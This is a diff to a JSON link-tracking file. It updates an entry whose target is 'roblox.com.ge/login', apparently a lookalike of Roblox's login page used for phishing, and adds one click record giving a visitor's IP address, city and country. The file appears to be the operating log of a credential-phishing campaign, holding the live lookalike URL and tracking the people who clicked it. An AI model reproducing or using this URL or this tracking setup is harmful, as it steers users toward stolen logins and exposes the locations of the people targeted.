@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1438,
+    "useCount": 1439,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11672,6 +11672,14 @@
         "city": "Pasadena",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777431696170,
+        "ip": "221.121.96.174",
+        "country": "Philippines",
+        "city": "Cebu City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
